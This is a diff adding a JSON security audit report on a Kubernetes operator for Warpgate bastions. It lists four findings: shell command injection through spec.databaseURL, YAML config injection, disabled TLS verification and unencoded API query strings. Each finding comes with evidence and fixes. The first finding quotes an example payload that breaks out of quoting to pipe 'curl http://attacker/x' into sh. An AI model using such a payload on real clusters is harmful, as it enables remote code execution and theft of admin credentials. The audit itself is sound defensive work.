@@ -1,0 +1,75 @@
+{
+  "summary": "Reviewed the warpgate-operator Go codebase (a Kubernetes operator that manages Warpgate bastion instances and their users, targets, roles, credentials, tickets, and connections) across cmd/, api/v1alpha1/, and internal/. The most notable issue is OS command injection into the init-container shell script generated from the unvalidated spec.databaseURL field of a WarpgateInstance. Several lower-severity issues involve unescaped interpolation into the generated warpgate.yaml, an always-on TLS verification bypass for operator-created connections, and unencoded user input in Warpgate API query strings. Overall risk is moderate: the injection sinks are reachable only by principals already allowed to create/modify the operator's CRDs, but the controller code does not sanitize those inputs before using them in security-sensitive sinks.",
+  "coverage": [
+    "cmd/main.go",
+    "internal/controller/helpers.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgatepublickeycredential_controller.go",
+    "internal/controller/warpgatetarget_controller.go",
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/ssh_keys.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateconnection_webhook.go",
+    "api/v1alpha1/warpgateinstance_types.go"
+  ],
+  "findings": [
+    {
+      "title": "OS command injection via spec.databaseURL in WarpgateInstance init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "high",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles a shell script that is run as the init container's command via `/bin/sh -c <script>` (Command: []string{\"/bin/sh\", \"-c\", initScript} at lines 773-776). The WarpgateInstance spec.databaseURL field is concatenated directly into that script inside a double-quoted argument with no escaping or validation. The admission webhook (api/v1alpha1/warpgateinstance_webhook.go, validateWarpgateInstance) never validates the content of databaseURL. Any principal able to create or update a WarpgateInstance can set databaseURL to a value such as `x\"; curl http://attacker/x | sh; echo \"` to break out of the quoted argument and execute arbitrary commands in the init container, which runs with the Warpgate image, the mounted ADMIN_PASSWORD env var, and the pod's service account. The same unescaped pattern applies to the config-file sink at line 345.",
+      "evidence": "L556-558: `if inst.Spec.DatabaseURL != \"\" {\\n    setupCmd += fmt.Sprintf(\" --database-url \\\"%s\\\"\", inst.Spec.DatabaseURL)\\n}` -> setupCmd is embedded into initScript (L567-575) -> `Command: []string{\"/bin/sh\", \"-c\", initScript}` (L776). databaseURL is attacker-controlled CR spec with no webhook validation.",
+      "recommendation": "Do not build the shell command by string concatenation of user input. Pass databaseURL to the setup binary via an environment variable sourced from the CR/secret (as ADMIN_PASSWORD already is) and reference it with proper quoting, or exec the binary directly with an argv slice instead of `sh -c`. Additionally validate databaseURL in the webhook against an allowlisted scheme/format (e.g. a parsed postgres:// or sqlite: URL)."
+    },
+    {
+      "title": "warpgate.yaml config injection via unescaped spec.externalHost and spec.databaseURL",
+      "category": "security",
+      "cwe": "CWE-94",
+      "severity": "low",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 379,
+      "line_end": 381,
+      "description": "buildWarpgateConfig writes spec.externalHost into the generated warpgate.yaml ConfigMap unquoted (`external_host: %s`), and spec.databaseURL into a double-quoted YAML string (line 345), with no escaping and no webhook validation. A WarpgateInstance author can embed newlines/YAML syntax (e.g. externalHost containing `\\n` followed by additional YAML keys) to inject or override arbitrary Warpgate configuration directives in the rendered config file. Impact is limited because the same principal can already supply a full configOverride, but this is a distinct injection sink that bypasses any policy that only restricts configOverride.",
+      "evidence": "L380: `fmt.Fprintf(&b, \"external_host: %s\\n\", inst.Spec.ExternalHost)` (unquoted); L345: `fmt.Fprintf(&b, \"database_url: \\\"%s\\\"\\n\", inst.Spec.DatabaseURL)`. Both values are raw CR spec strings; validateWarpgateInstance performs no content validation.",
+      "recommendation": "Render the config with a real YAML marshaller (e.g. sigs.k8s.io/yaml / gopkg.in/yaml.v3) that quotes and escapes scalar values, instead of fmt.Fprintf string building. Validate externalHost as a hostname and databaseURL as a URL in the admission webhook."
+    },
+    {
+      "title": "TLS certificate verification permanently disabled for operator-created WarpgateConnection",
+      "category": "security",
+      "cwe": "CWE-295",
+      "severity": "low",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 1109,
+      "line_end": 1113,
+      "description": "ensureWarpgateConnection hard-codes InsecureSkipVerify: true on the auto-created WarpgateConnection that the operator later uses to drive the Warpgate admin API with the instance's admin username/password. Because certificate validation is disabled, an attacker able to intercept the in-cluster TLS connection between the operator and the Warpgate service (e.g. via ARP/DNS spoofing or a malicious pod on the path) can present any certificate, man-in-the-middle the session, and capture the Warpgate admin credentials that getWarpgateClient sends. The setting cannot be turned off for this path.",
+      "evidence": "L1112: `InsecureSkipVerify: true, // self-signed cert within cluster` set on conn.Spec, consumed by helpers.go getWarpgateClient (L57/L85) -> warpgate.NewClient -> tls.Config{InsecureSkipVerify: true} (client.go L55-59). Admin password is sent on this same client.",
+      "recommendation": "Mount/trust the cert-manager (or self-signed) CA that signs the instance certificate and set the client to verify against it (RootCAs) rather than skipping verification. At minimum, make this behavior opt-in and default to verification once a CA is available."
+    },
+    {
+      "title": "Unencoded user input in Warpgate API search query string (ListUsers/ListTargets)",
+      "category": "security",
+      "cwe": "CWE-74",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "internal/warpgate/user.go",
+      "line_start": 79,
+      "line_end": 83,
+      "description": "ListUsers builds the request path by concatenating the caller-supplied search term directly into the query string without URL-encoding (`path += \"?search=\" + search`). The search value originates from CR spec fields (e.g. WarpgatePasswordCredential.Spec.Username / WarpgatePublicKeyCredential.Spec.Username passed through GetUserByUsername). A username containing characters such as `&`, `#`, `=`, or whitespace is sent verbatim to the Warpgate admin API, allowing injection of additional query parameters or truncation of the intended one, which can skew the lookup. The identical pattern exists in internal/warpgate/target.go ListTargets (lines 206-210). Impact is limited because the exact-match loop still filters results and requests use the operator's own credentials.",
+      "evidence": "user.go L81-82: `if search != \"\" { path += \"?search=\" + search }`; reached from GetUserByUsername(cred.Spec.Username). Same sink in target.go L208-209.",
+      "recommendation": "Build the query with net/url, e.g. `u := url.Values{}; u.Set(\"search\", search); path += \"?\" + u.Encode()`, so values are properly percent-encoded."
+    }
+  ]
+}
